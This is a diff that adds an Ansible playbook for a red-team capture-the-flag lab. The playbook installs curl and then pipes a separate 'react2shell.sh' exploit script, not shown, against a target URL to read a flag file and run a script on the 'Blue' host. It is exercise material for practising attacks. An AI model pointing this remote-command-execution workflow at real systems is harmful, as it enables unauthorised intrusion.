@@ -1,0 +1,27 @@
+---
+- name: Red Team | Capture the flag with React2Shell
+  hosts: red_team
+  gather_facts: false
+  vars:
+    react2shell_command: >-
+      cat /opt/react2shell-lab/capture/flag.txt && /opt/react2shell-lab/capture/show_message.sh
+  tasks:
+    - name: Ensure curl is available
+      become: true
+      vars:
+        walkthrough_caption: Install curl on the Red VM.
+      ansible.builtin.package:
+        name: curl
+        state: present
+
+    - name: Read the capture files through the exploit
+      vars:
+        walkthrough_caption: Use the React2Shell bug to read the flag and run the capture script on Blue.
+      ansible.builtin.shell:
+        cmd: >-
+          bash -s -- exploit
+          {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }}
+          {{ react2shell_command | quote }}
+        stdin: "{{ lookup('ansible.builtin.file', playbook_dir ~ '/../scripts/react2shell.sh') }}"
+        executable: /bin/bash
+      changed_when: false
